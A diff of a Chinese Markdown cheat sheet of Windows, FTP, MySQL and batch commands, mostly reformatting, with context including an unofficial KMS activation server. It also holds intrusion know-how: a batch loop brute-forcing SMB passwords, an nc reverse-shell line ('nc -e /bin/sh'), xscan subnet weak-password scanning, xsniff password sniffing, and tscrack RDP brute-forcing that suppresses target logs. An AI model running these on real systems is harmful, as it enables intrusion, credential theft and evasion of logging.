@@ -6,256 +6,136 @@ slmgr /skms kms.03k.org
 slmgr /ato
 ```
 
+# 客户端激活码
+
+[适用于 Windows Server 和 Windows 的密钥管理服务 (KMS) 客户端激活和产品密钥 | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/get-started/kms-client-activation-keys)
+
 # 常用命令
 
 1. slmgr.vbs -xpr #系统激活查看
-
 2. gpedit.msc—–组策略
-
 3. sndrec32——-录音机
-
 4. Sysprep——进入审核模式初始化OOBE
-
 5. explorer——-打开资源管理器
-
 6. logoff———注销命令
-
 7. tsshutdn——-60秒倒计时关机命令
-
 8. lusrmgr.msc—-本机用户和组
-
 9. services.msc—本地服务设置
-
 10. oobe/msoobe/a—-检查XP是否激活
-
 11. notepad——–打开记事本
-
 12. cleanmgr——-垃圾整理
-
 13. netstartmessenger—-开始信使服务
-
 14. compmgmt.msc—计算机管理
-
 15. netstopmessenger—–停止信使服务
-
 16. conf———–启动netmeeting
-
 17. dvdplay——–DVD播放器
-
 18. charmap——–启动字符映射表
-
 19. diskmgmt.msc—磁盘管理实用程序
-
 20. calc———–启动计算器
-
 21. dfrg.msc——-磁盘碎片整理程序
-
 22. chkdsk.exe—–Chkdsk磁盘检查
-
 23. devmgmt.msc—设备管理器
-
 24. regsvr32/u*.dll—-停止dll文件运行
-
 25. drwtsn32——系统医生
-
 26. rononce-p—-15秒关机
-
 27. dxdiag———检查DirectX信息
-
 28. regedt32——-注册表编辑器
-
 29. Msconfig.exe—系统配置实用程序可设置引导和启动项
-
 30. rsop.msc——-组策略结果集
-
 31. mem.exe——–显示内存使用情况
-
 32. regedit.exe—-注册表
-
 33. winchat——–XP自带局域网聊天
-
 34. progman——–程序管理器
-
 35. winmsd———系统信息
-
 36. perfmon.msc—-计算机性能监测程序
-
 37. winver———检查Windows版本
-
 38. sfc/scannow—–扫描错误并复原
-
 39. taskschd.msc—–任务计划程序
-
 40. winver———检查Windows版本
-
 41. wmimgmt.msc—-打开windows管理体系结构(WMI)
-
 42. wupdmgr——–windows更新程序
-
 43. wscript——–windows脚本宿主设置
-
 44. write———-写字板
-
 45. winmsd———系统信息
-
 46. wiaacmgr——-扫描仪和照相机向导
-
 47. winchat——–XP自带局域网聊天
-
 48. mem.exe——–显示内存使用情况
-
 49. mplayer2——-简易widnowsmediaplayer
-
 50. mspaint——–画图板
-
 51. mstsc———-远程桌面连接
-
 52. mplayer2——-媒体播放机
-
 53. magnify——–放大镜实用程序
-
 54. mmc————打开控制台
-
 55. mobsync——–同步命令
-
 56. dxdiag———检查DirectX信息
-
 57. drwtsn32——系统医生
-
 58. devmgmt.msc—设备管理器
-
 59. dfrg.msc——-磁盘碎片整理程序
-
 60. diskmgmt.msc—磁盘管理实用程序
-
 61. dcomcnfg——-打开系统组件服务
-
 62. ddeshare——-打开DDE共享设置
-
 63. dvdplay——–DVD播放器
-
 64. net stop messenger—–停止信使服务
-
 65. net start messenger—-开始信使服务
-
 66. notepad——–打开记事本
-
 67. nslookup——-网络管理的工具向导
-
 68. ntbackup——-系统备份和还原
-
 69. narrator——-屏幕“讲述人”
-
 70. ntmsmgr.msc—-移动存储管理器
-
 71. ntmsoprq.msc—移动存储管理员操作请求
-
 72. netstat -an—-(TC)命令检查接口
-
 73. syncapp——–创建一个公文包
-
 74. sysedit——–系统配置编辑器
-
 75. sigverif——-文件签名验证程序
-
 76. sndrec32——-录音机
-
 77. shrpubw——–创建共享文件夹
-
 78. secpol.msc—–本地安全策略
-
 79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码
-
 80. services.msc—本地服务设置
-
 81. Sndvol32——-音量控制程序
-
 82. sfc.exe——–系统文件检查器
-
 83. sfc /scannow—windows文件保护
-
 84. tsshutdn——-60秒倒计时关机命令
-
 85. tourstart——xp简介（安装完成后出现的漫游xp程序）
-
 86. taskmgr——–任务管理器
-
 87. eventvwr——-事件查看器
-
 88. eudcedit——-造字程序
-
 89. explorer——-打开资源管理器
-
 90. packager——-对象包装程序
-
 91. perfmon.msc—-计算机性能监测程序
-
 92. progman——–程序管理器
-
 93. regedit.exe—-注册表
-
 94. rsop.msc——-组策略结果集
-
 95. regedt32——-注册表编辑器
-
 96. rononce -p —-15秒关机
-
 97. regsvr32 /u *.dll—-停止dll文件运行
-
 98. regsvr32 /u zipfldr.dll——取消ZIP支持
-
 99. cmd.exe——–CMD命令提示符
-
 100. chkdsk.exe—–Chkdsk磁盘检查
-
 101. certmgr.msc—-证书管理实用程序
-
 102. calc———–启动计算器
-
 103. charmap——–启动字符映射表
-
 104. cliconfg——-SQL SERVER 客户端网络实用程序
-
 105. Clipbrd——–剪贴板查看器
-
 106. conf———–启动netmeeting
-
 107. compmgmt.msc—计算机管理
-
 108. cleanmgr——-垃圾整理
-
 109. ciadv.msc——索引服务程序
-
 110. osk————打开屏幕键盘
-
 111. odbcad32——-ODBC数据源管理器
-
 112. oobe/msoobe /a—-检查XP是否激活
-
 113. lusrmgr.msc—-本机用户和组
-
 114. logoff———注销命令
-
 115. iexpress——-木马捆绑工具，系统自带
-
 116. Nslookup——-IP地址侦测器
-
 117. fsmgmt.msc—–共享文件夹管理器
-
 118. utilman——–辅助工具管理器
-
 119. gpedit.msc—–组策略
-
 120. explorer——-打开资源管理器
-
 121. UserAccountControlSettings.exe — UAC
-
 122. secedit —- 命令行下操作组策略
-
 123. sysdm.cpl — 系统属性
-
 124. appwiz.cpl — 软件卸载
-
 
 # 操作详解
 
@@ -502,13 +382,12 @@ iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务
 ftp的命令行格式为:
 
 ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。
-    
-    －d 使用调试方式。
-    
-    －n 限制ftp的自动登录,即不使用.netrc文件。
-    
-    －g 取消全局文件名。
 
+－d 使用调试方式。
+
+－n 限制ftp的自动登录,即不使用.netrc文件。
+
+－g 取消全局文件名。
 help [命令] 或 ？[命令] 查看命令说明
 
 bye 或 quit 终止主机FTP进程,并退出FTP管理方式.
@@ -571,8 +450,6 @@ cdup 进入远程主机目录的父目录
 
 ! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip
 
-
-
 # MYSQL 命令
 
 mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。
@@ -610,7 +487,6 @@ delete from 表名; 将表中记录清空
 select * from 表名; 显示表中的记录
 
 mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。
-
 
 ## win2003系统下新增命令（实用部份）：
 
@@ -726,8 +602,6 @@ FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200
 
 存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。
 
-
-
 ## if命令及变量 基本格式
 
 IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。
@@ -754,36 +628,35 @@ IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1
 
 参数说明：
 
-    -h 查看帮助信息
-    
-    -d 后台模式
-    
-    -e prog程序重定向，一但连接就执行[危险]
-    
-    -i secs延时的间隔
-    
-    -l 监听模式，用于入站连接
-    
-    -L 监听模式，连接天闭后仍然继续监听，直到CTR+C
-    
-    -n IP地址，不能用域名
-    
-    -o film记录16进制的传输
-    
-    -p[空格]端口 本地端口号
-    
-    -r 随机本地及远程端口
-    
-    -t 使用Telnet交互方式
-    
-    -u UDP模式
-    
-    -v 详细输出，用-vv将更详细
-    
-    -w数字 timeout延时间隔
-    
-    -z 将输入，输出关掉（用于扫锚时）
+-h 查看帮助信息
 
+-d 后台模式
+
+-e prog程序重定向，一但连接就执行[危险]
+
+-i secs延时的间隔
+
+-l 监听模式，用于入站连接
+
+-L 监听模式，连接天闭后仍然继续监听，直到CTR+C
+
+-n IP地址，不能用域名
+
+-o film记录16进制的传输
+
+-p[空格]端口 本地端口号
+
+-r 随机本地及远程端口
+
+-t 使用Telnet交互方式
+
+-u UDP模式
+
+-v 详细输出，用-vv将更详细
+
+-w数字 timeout延时间隔
+
+-z 将输入，输出关掉（用于扫锚时）
 基本用法：
 
 nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口
@@ -824,10 +697,9 @@ nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主�
 
 @ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中
 
->与>>的区别 ">"指：覆盖；">>"指：保存到(添加到）。
+> 与>>的区别 ">"指：覆盖；">>"指：保存到(添加到）。
 
 如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。
-
 
 ## 扫描工具：xscan.exe
 
@@ -839,48 +711,46 @@ xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机I
 
 检测项目
 
-    -active 检测主机是否存活
-    
-    -os 检测远程操作系统类型（通过NETBIOS和SNMP协议）
-    
-    -port 检测常用服务的端口状态
-    
-    -ftp 检测FTP弱口令
-    
-    -pub 检测FTP服务匿名用户写权限
-    
-    -pop3 检测POP3-Server弱口令
-    
-    -smtp 检测SMTP-Server漏洞
-    
-    -sql 检测SQL-Server弱口令
-    
-    -smb 检测NT-Server弱口令
-    
-    -iis 检测IIS编码/解码漏洞
-    
-    -cgi 检测CGI漏洞
-    
-    -nasl 加载Nessus攻击脚本
-    
-    -all 检测以上所有项目
+-active 检测主机是否存活
 
+-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）
+
+-port 检测常用服务的端口状态
+
+-ftp 检测FTP弱口令
+
+-pub 检测FTP服务匿名用户写权限
+
+-pop3 检测POP3-Server弱口令
+
+-smtp 检测SMTP-Server漏洞
+
+-sql 检测SQL-Server弱口令
+
+-smb 检测NT-Server弱口令
+
+-iis 检测IIS编码/解码漏洞
+
+-cgi 检测CGI漏洞
+
+-nasl 加载Nessus攻击脚本
+
+-all 检测以上所有项目
 其它选项
 
-    -i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取
-    
-    -l 显示所有网络适配器
-    
-    -v 显示详细扫描进度
-    
-    -p 跳过没有响应的主机
-    
-    -o 跳过没有检测到开放端口的主机
-    
-    -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10
-    
-    -log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)
+-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取
 
+-l 显示所有网络适配器
+
+-v 显示详细扫描进度
+
+-p 跳过没有响应的主机
+
+-o 跳过没有检测到开放端口的主机
+
+-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10
+
+-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)
 用法示例
 
 xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机
@@ -889,72 +759,68 @@ xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-1
 
 xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机
 
-
 ## 命令行方式嗅探器: xsniff.exe
 
 可捕获局域网内FTP/SMTP/POP3/HTTP协议密码
 
 参数说明
 
-    -tcp 输出TCP数据报
-    
-    -udp 输出UDP数据报
-    
-    -icmp 输出ICMP数据报
-    
-    -pass 过滤密码信息
-    
-    -hide 后台运行
-    
-    -host 解析主机名
-    
-    -addr IP地址 过滤IP地址
-    
-    -port 端口 过滤端口
-    
-    -log 文件名 将输出保存到文件
-    
-    -asc 以ASCII形式输出
-    
-    -hex 以16进制形式输出
+-tcp 输出TCP数据报
 
+-udp 输出UDP数据报
+
+-icmp 输出ICMP数据报
+
+-pass 过滤密码信息
+
+-hide 后台运行
+
+-host 解析主机名
+
+-addr IP地址 过滤IP地址
+
+-port 端口 过滤端口
+
+-log 文件名 将输出保存到文件
+
+-asc 以ASCII形式输出
+
+-hex 以16进制形式输出
 用法示例
 
 xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中
 
 xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
 
-
 ## 终端服务密码破解: tscrack.exe
 
 参数说明
 
-    -h 显示使用帮助
-    
-    -v 显示版本信息
-    
-    -s 在屏幕上打出解密能力
-    
-    -b 密码错误时发出的声音
-    
-    -t 同是发出多个连接（多线程）
-    
-    -N Prevent System Log entries on targeted server
-    
-    -U 卸载移除tscrack组件
-    
-    -f 使用－f后面的密码
-    
-    -F 间隔时间（频率）
-    
-    -l 使用－l后面的用户名
-    
-    -w 使用－w后面的密码字典
-    
-    -p 使用－p后面的密码
-    
-    -D 登录主页面
+-h 显示使用帮助
 
+-v 显示版本信息
+
+-s 在屏幕上打出解密能力
+
+-b 密码错误时发出的声音
+
+-t 同是发出多个连接（多线程）
+
+-N Prevent System Log entries on targeted server
+
+-U 卸载移除tscrack组件
+
+-f 使用－f后面的密码
+
+-F 间隔时间（频率）
+
+-l 使用－l后面的用户名
+
+-w 使用－w后面的密码字典
+
+-p 使用－p后面的密码
+
+-D 登录主页面
 用法示例
 
 tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码
@@ -985,7 +851,6 @@ nscan
 
 hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。
 
-
 ## Shutdown.exe
 
 Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）
@@ -1014,14 +879,13 @@ FTP的命令行格式为：
 
 ftp -v -d -i -n -g [主机名] ，其中
 
-    -v 显示远程服务器的所有响应信息
-    
-    -n 限制ftp的自动登录，即不使用；.n etrc文件；
-    
-    -d 使用调试方式；
-    
-    -g 取消全局文件名。
+-v 显示远程服务器的所有响应信息
 
+-n 限制ftp的自动登录，即不使用；.n etrc文件；
+
+-d 使用调试方式；
+
+-g 取消全局文件名。
 FTP使用的内部命令如下(中括号表示可选项):
 
 1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip
